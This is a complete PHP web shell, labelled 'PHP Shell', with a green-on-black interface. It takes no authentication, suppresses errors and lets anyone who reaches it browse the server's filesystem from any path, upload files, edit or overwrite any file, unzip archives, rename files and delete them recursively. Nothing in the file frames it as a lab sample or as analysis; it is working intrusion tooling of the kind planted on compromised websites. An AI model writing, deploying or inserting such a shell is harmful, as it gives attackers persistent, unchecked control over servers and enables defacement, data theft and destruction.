<?php
error_reporting(0);
set_time_limit(0);

$cwd = getcwd();
$currentPath = isset($_POST['path']) ? $_POST['path'] : $cwd;
chdir($currentPath);
$files = scandir($currentPath);

function perms($file){
    $perms = fileperms($file);
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-') .
             (($perms & 0x0080) ? 'w' : '-') .
             (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-') .
             (($perms & 0x0010) ? 'w' : '-') .
             (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-') .
             (($perms & 0x0002) ? 'w' : '-') .
             (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function delete_recursive($target) {
    if (is_dir($target)) {
        $items = scandir($target);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            delete_recursive($target . DIRECTORY_SEPARATOR . $item);
        }
        rmdir($target);
    } else {
        unlink($target);
    }
}

if (isset($_POST['delete_selected']) && isset($_POST['selected'])) {
    foreach ($_POST['selected'] as $file) {
        $target = $_POST['path'].'/'.$file;
        delete_recursive($target);
    }
}

if (isset($_POST['save']) && isset($_POST['editfile'])) {
    file_put_contents($_POST['editfile'], $_POST['content']);
}

if (isset($_FILES['upload'])) {
    $upfile = $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $currentPath.'/'.$upfile);
}

if (isset($_POST['unzip'])) {
    $zipPath = $_POST['path'].'/'.$_POST['unzip'];
    $zip = new ZipArchive();
    if ($zip->open($zipPath) === TRUE) {
        $zip->extractTo($currentPath);
        $zip->close();
    }
}

if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    $foldername = trim($_POST['foldername']);
    $newpath = $currentPath . DIRECTORY_SEPARATOR . $foldername;
    if (!file_exists($newpath)) {
        mkdir($newpath);
    }
}

if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old = $currentPath . DIRECTORY_SEPARATOR . $_POST['rename_old'];
    $new = $currentPath . DIRECTORY_SEPARATOR . $_POST['rename_new'];
    if (file_exists($old)) {
        rename($old, $new);
    }
}

echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>PHP Shell</title><style>
body{background:#000;color:#0f0;font-family:monospace;}
a{color:#0f0;text-decoration:none;}
input,textarea,select,button{background:#222;color:#0f0;border:1px solid #0f0;}
table{width:100%;border-collapse:collapse}
td,th{padding:5px;border:1px solid #0f0;}
</style></head><body>";

echo "<form method='post' enctype='multipart/form-data'>
<h3>Current Path: $currentPath</h3>
<input type='hidden' name='path' value=\"$currentPath\">";

echo "<b>Create Folder:</b><br>
<input type='text' name='foldername' placeholder='folder-name'>
<button type='submit' name='newfolder'>Create</button><br><br>";

echo "<b>Upload File:</b><br>
<input type='file' name='upload'>
<button type='submit'>Upload</button><br><br>";

echo "<button type='submit' name='delete_selected'>🗑️ Delete Selected</button><br><br>";

echo "<table><tr><th><input type='checkbox' onclick='selectAll(this)'></th><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Action</th></tr>";

if ($currentPath != $cwd) {
    echo "<tr><td colspan='6'>
        <button type='submit' name='path' value='".htmlspecialchars(dirname($currentPath))."'>⬅️ Parent Folder</button>
    </td></tr>";
}

echo "<script>
function selectAll(source) {
    checkboxes = document.getElementsByName('selected[]');
    for(var i=0; i<checkboxes.length; i++) {
        checkboxes[i].checked = source.checked;
    }
}
function renameFile(oldName) {
    document.getElementById('renameForm').style.display = 'block';
    document.getElementById('rename_old').value = oldName;
    document.getElementById('rename_new').focus();
}
</script>";

foreach($files as $file){
    if($file == "." || $file == "..") continue;
    $fullpath = $currentPath . DIRECTORY_SEPARATOR . $file;
    echo "<tr><td><input type='checkbox' name='selected[]' value=\"$file\"></td><td>";
    if(is_dir($fullpath)){
        echo "<button type='submit' name='path' value=\"$fullpath\">📁 $file</button>";
    } else {
        echo $file;
    }
    echo "</td><td>".(is_file($fullpath)?filesize($fullpath):'-')."</td>";
    echo "<td>".perms($fullpath)."</td>";
    echo "<td>".date("Y-m-d H:i:s", filemtime($fullpath))."</td>";
    echo "<td>
        <button type='submit' name='delete' value=\"$file\">❌ Delete</button>";
    if(pathinfo($file, PATHINFO_EXTENSION) == 'zip'){
        echo "<button type='submit' name='unzip' value=\"$file\">🗜️ Unzip</button>";
    }
    echo "<button type='submit' name='edit' value=\"$file\">✏️ Edit</button>
    <button type='button' onclick='renameFile(\"$file\")'>✏️ Rename</button>";
    echo "</td></tr>";
}
echo "</table><br></form>";

if (isset($_POST['edit']) && isset($_POST['edit'])) {
    $fileToEdit = $currentPath . DIRECTORY_SEPARATOR . $_POST['edit'];
    if (file_exists($fileToEdit)) {
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h3>Editing: ".basename($fileToEdit)."</h3>
        <form method='post'>
        <input type='hidden' name='editfile' value=\"$fileToEdit\">
        <input type='hidden' name='path' value=\"$currentPath\">
        <textarea name='content' rows='20' style='width:100%;'>$content</textarea><br>
        <button type='submit' name='save'>Save</button>
        </form>";
    }
}

if (isset($_POST['delete']) && !empty($_POST['delete'])) {
    $target = $currentPath . DIRECTORY_SEPARATOR . $_POST['delete'];
    delete_recursive($target);
}

echo "<form method='post' id='renameForm' style='display:none;'>
<input type='hidden' name='path' value=\"$currentPath\">
<input type='hidden' name='rename_old' id='rename_old'>
<input type='text' name='rename_new' id='rename_new' placeholder='New name'>
<button type='submit'>✅ Rename</button>
</form>";

echo "</body></html>";
?>
